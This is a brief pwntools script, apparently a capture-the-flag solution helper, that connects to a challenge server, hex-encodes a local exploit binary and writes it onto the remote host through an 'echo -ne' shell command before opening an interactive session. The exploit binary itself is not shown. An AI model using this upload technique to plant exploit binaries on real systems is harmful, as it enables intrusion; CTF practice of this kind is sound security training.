#!/usr/bin/env python

from pwn import *

r = remote("memory.chal.irisc.tf", 1337)

upload = "echo -ne '"

with open("exp", "rb") as exp:
    while (byte := exp.read(1)):
        upload += f'\\x{ord(byte):02x}'
    upload += "' > lol"

    #print(upload)


r.sendline(upload)
r.interactive()
